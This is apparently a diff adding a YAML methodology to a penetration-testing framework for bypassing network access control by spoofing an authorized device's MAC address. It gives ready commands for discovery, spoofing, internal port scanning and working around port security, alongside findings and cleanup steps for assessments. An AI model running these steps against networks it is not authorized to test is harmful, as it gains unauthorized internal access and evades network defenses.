@@ -1,0 +1,194 @@
+id: mac_spoofing_nac_bypass
+name: MAC Address Spoofing for NAC Bypass
+category: NAC Bypass
+priority: critical
+description: Clone MAC address of an authorized device to bypass Network Access Control.
+detailed_description: |
+  Bypass NAC systems by identifying and spoofing the MAC address of an authorized device.
+  This technique exploits weak NAC implementations that rely solely on MAC address authentication.
+
+required_conditions:
+  - nac_present
+  - physical_access
+
+optional_conditions:
+  - authorized_device_identified
+  - target_device_offline
+
+tools:
+  - name: macchanger
+    description: MAC address manipulation utility
+    platform: linux
+  - name: airodump-ng
+    description: Wireless packet capture
+    platform: linux
+  - name: arp-scan
+    description: ARP network scanner
+    platform: linux
+
+phases:
+  - name: reconnaissance
+    steps:
+      - id: discover_authorized_macs
+        action: Discover authorized MAC addresses
+        command: sudo arp-scan -l -I {interface_name}
+        alternatives:
+          - shell: wireless
+            command: sudo airodump-ng {wireless_interface}mon
+          - shell: nmap
+            command: sudo nmap -sn {network_range}
+        output_variables:
+          - authorized_macs
+          - active_devices
+
+      - id: identify_offline_target
+        action: Identify offline authorized device
+        command: |
+          # Monitor for device that goes offline
+          while true; do
+            ping -c 1 -W 1 {target_ip} || echo "Device offline"
+            sleep 5
+          done
+
+      - id: check_port_security
+        action: Check for port security restrictions
+        command: |
+          # Try to detect sticky MAC or port security
+          sudo macchanger -s {interface_name}
+
+  - name: execution
+    steps:
+      - id: interface_down
+        action: Bring interface down
+        command: sudo ifconfig {interface_name} down
+        alternatives:
+          - shell: ip
+            command: sudo ip link set dev {interface_name} down
+
+      - id: spoof_mac
+        action: Change MAC address to target
+        command: sudo macchanger -m {target_mac_address} {interface_name}
+        alternatives:
+          - shell: ip
+            command: sudo ip link set dev {interface_name} address {target_mac_address}
+          - shell: windows_registry
+            command: |
+              reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\{adapter_number}" /v NetworkAddress /t REG_SZ /d {mac_without_colons}
+
+      - id: interface_up
+        action: Bring interface up
+        command: sudo ifconfig {interface_name} up
+        alternatives:
+          - shell: ip
+            command: sudo ip link set dev {interface_name} up
+
+      - id: verify_mac_change
+        action: Verify MAC address changed
+        command: ip link show {interface_name} | grep ether
+        alternatives:
+          - shell: windows_cmd
+            command: getmac /v
+
+  - name: validation
+    steps:
+      - id: request_network_access
+        action: Request network access with spoofed MAC
+        command: sudo dhclient {interface_name}
+        alternatives:
+          - shell: windows_cmd
+            command: ipconfig /renew {adapter_name}
+
+      - id: test_access
+        action: Test network access level
+        command: |
+          ping -c 3 {gateway_ip}
+          nslookup {internal_domain}
+
+      - id: verify_nac_bypass
+        action: Verify NAC bypass successful
+        command: |
+          # Test access to restricted resources
+          nmap -sT -p 445,3389,22 {internal_network_range}
+
+triggers:
+  on_complete:
+    - methodology: network_discovery
+      condition: nac_bypassed
+    - methodology: credential_testing
+      condition: internal_access_gained
+
+findings:
+  - id: weak_nac_implementation
+    title: Weak NAC Implementation
+    severity: high
+    description: NAC can be bypassed through MAC address spoofing
+
+  - id: no_port_security
+    title: No Port Security Configuration
+    severity: medium
+    description: Switch ports allow MAC address changes without restriction
+
+  - id: no_continuous_auth
+    title: Lack of Continuous Authentication
+    severity: medium
+    description: NAC does not perform continuous validation after initial authentication
+
+issues:
+  - symptom: Port security violation
+    severity: high
+    causes:
+      - Sticky MAC configured
+      - Maximum MAC addresses exceeded
+      - Port shutdown on violation
+    resolutions:
+      - Wait for port security aging time
+      - Try different switch port
+      - Force target device disconnect first
+
+  - symptom: Duplicate MAC detected
+    severity: high
+    causes:
+      - Target device still online
+      - Switch detects duplicate
+      - Spanning tree issues
+    resolutions:
+      - Ensure target device offline
+      - Wait for ARP cache timeout
+      - Try from different network segment
+
+  - symptom: Adapter doesn't support MAC change
+    severity: medium
+    causes:
+      - Hardware limitation
+      - Driver restriction
+      - Virtual adapter
+    resolutions:
+      - Use different network adapter
+      - Try alternative spoofing method
+      - Use USB ethernet adapter
+
+cleanup:
+  - priority: high
+    action: Restore original MAC address
+    command: sudo macchanger -p {interface_name}
+
+  - priority: medium
+    action: Release DHCP lease
+    command: sudo dhclient -r {interface_name}
+
+  - priority: low
+    action: Clear ARP cache
+    command: sudo ip -s -s neigh flush all
+
+outcome_analysis:
+  success_indicators:
+    - MAC address successfully changed
+    - Network access obtained
+    - Restricted resources accessible
+    - No port security violations
+
+  failure_indicators:
+    - Port security violation triggered
+    - Duplicate MAC detected
+    - NAC performs additional checks
+    - Certificate validation required
